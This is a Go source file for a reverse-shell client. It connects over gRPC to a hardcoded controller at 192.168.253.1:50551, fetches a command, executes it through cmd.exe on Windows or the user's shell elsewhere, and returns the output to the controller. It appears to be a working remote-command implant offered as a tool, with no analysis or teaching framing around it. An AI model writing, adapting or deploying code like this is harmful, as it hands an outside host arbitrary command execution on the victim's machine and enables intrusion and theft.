package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"

	pb "github.com/bartimus-primed/proto/reverse/reverse_pb"
	"google.golang.org/grpc"
)

const (
	address     = "192.168.253.1:50551"
	defaultName = "client0"
)

var recv bool = true
var shouldExit bool = false

// var wchan chan bool

func main() {
	conn, err := grpc.Dial(address, grpc.WithInsecure())
	if err != nil {
		log.Fatalf("did not connect: %v", err)
	}
	defer conn.Close()
	c := pb.NewReverseInteractClient(conn)

	// stream, err := c.HandsOn(context.Background())
	// if err != nil {
	// 	panic(err.Error())
	// }
	command_receive, err := c.GetCommand(context.Background(), &pb.Response{
		RanCommand: "",
		Resp:       "",
		Success:    false,
		Ready:      true,
	})
	if err != nil {
		panic("Command Error...")
	}
	cmd := strings.Split(command_receive.GetCmd(), " ")
	cleaned_cmd := strings.TrimSpace(command_receive.GetCmd())
	if cleaned_cmd != "exit" {
		var cmdstruct *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd_clean := []string{"cmd.exe", "/c"}
			for _, a := range cmd {
				cmd_clean = append(cmd_clean, a)
			}
			cmdstruct = &exec.Cmd{
				Path: "cmd.exe",
				Args: cmd_clean,
			}
		} else {
			cmdstruct = exec.Command(os.Getenv("SHELL"), "-c", strings.Join(cmd, " "))
		}
		fmt.Println(cmdstruct.Path, cmdstruct.Args)
		out, err := cmdstruct.CombinedOutput()
		if err != nil {
			c.GetCommand(context.Background(), &pb.Response{Resp: fmt.Sprintf("Failed with: ", err), Success: false})
		}
		c.GetCommand(context.Background(), &pb.Response{Resp: string(out), RanCommand: command_receive.GetCmd(), Success: true})
	}
}
